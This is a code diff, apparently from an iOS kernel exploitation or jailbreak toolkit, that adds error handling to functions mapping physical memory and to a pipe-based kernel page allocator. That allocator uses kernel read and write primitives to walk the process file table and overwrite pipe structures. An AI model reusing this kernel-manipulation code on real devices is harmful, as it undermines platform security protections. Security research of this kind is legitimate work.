@@ -34,7 +34,8 @@ uint64_t map_phys_data(uint64_t pa, uint32_t size) {
     uint64_t page = trunc_page_kernel(pa);
     void *mapped = NULL;
     
-    IOSurface_map_withCacheMode(page, size, &mapped, 0);
+    int result = IOSurface_map_withCacheMode(page, size, &mapped, 0);
+    if (result != 0 || mapped == NULL) return 0;
     return (uint64_t)mapped;
 }
 
@@ -43,7 +44,8 @@ uint64_t map_writeback_page(uint64_t pa) {
     uint64_t page = trunc_page_kernel(pa);
     void *mapped = NULL;
     
-    IOSurface_map_withCacheMode(page, 0x4000, &mapped, IO_MAP_INNER_WRITEBACK);
+    int result = IOSurface_map_withCacheMode(page, 0x4000, &mapped, IO_MAP_INNER_WRITEBACK);
+    if (result != 0 || mapped == NULL) return 0;
     return (uint64_t)mapped;
 }
 
@@ -62,23 +64,67 @@ uint64_t map_physread64(uint64_t pa) {
 
 uint64_t kalloc_page(void) {
     int fds[2] = {-1, -1};
-    pipe(fds);
+    if (pipe(fds) != 0) return 0;
+
+    if (momentarius.allocator_fd_count >= MOMENTARIUS_MAX_ALLOCATOR_PIPES) {
+        close(fds[0]);
+        close(fds[1]);
+        return 0;
+    }
+
     uint64_t *temp = calloc(1, 0x4000);
-    write(fds[1], temp, 0x4000);
-    read(fds[0], temp, 0x4000);
+    if (temp == NULL) {
+        close(fds[0]);
+        close(fds[1]);
+        return 0;
+    }
+
+    ssize_t written = write(fds[1], temp, 0x4000);
+    if (written != 0x4000) {
+        free(temp);
+        close(fds[0]);
+        close(fds[1]);
+        return 0;
+    }
+
+    ssize_t read_count = read(fds[0], temp, 0x4000);
+    if (read_count != 0x4000) {
+        free(temp);
+        close(fds[0]);
+        close(fds[1]);
+        return 0;
+    }
     free(temp);
     sync();
     
+    if (momentarius.self_proc_addr == 0 || !KADDR_VALID(momentarius.self_proc_addr)) goto fail_pipe;
     uint64_t offset = koffsetof(proc, fd) + koffsetof(filedesc, ofiles_start);
     uint64_t fd_ofiles = kread_ptr(momentarius.self_proc_addr + offset);
+    if (fd_ofiles == 0 || !KADDR_VALID(fd_ofiles)) goto fail_pipe;
+
     uint64_t fproc = kread_ptr(fd_ofiles + fds[0] * 0x8);
+    if (fproc == 0 || !KADDR_VALID(fproc)) goto fail_pipe;
+
     uint64_t f_fglob = kread_ptr(fproc + 0x10);
+    if (f_fglob == 0 || !KADDR_VALID(f_fglob)) goto fail_pipe;
     
     uint64_t fg_data = kread_ptr(f_fglob + 0x38);
+    if (fg_data == 0 || !KADDR_VALID(fg_data)) goto fail_pipe;
+
     uint64_t pipe_buf = kread_ptr(fg_data + 0x10);
+    if (pipe_buf == 0 || !KADDR_VALID(pipe_buf)) goto fail_pipe;
+
     uint8_t empty[32] = {0};
     kwritebuf(fg_data, empty, 32);
+    uint32_t slot = momentarius.allocator_fd_count++;
+    momentarius.allocator_fds[slot][0] = fds[0];
+    momentarius.allocator_fds[slot][1] = fds[1];
     return pipe_buf;
+
+fail_pipe:
+    close(fds[0]);
+    close(fds[1]);
+    return 0;
 }
 
 uint32_t a64_gen_movk(uint8_t rd, int32_t imm, uint8_t sh) {
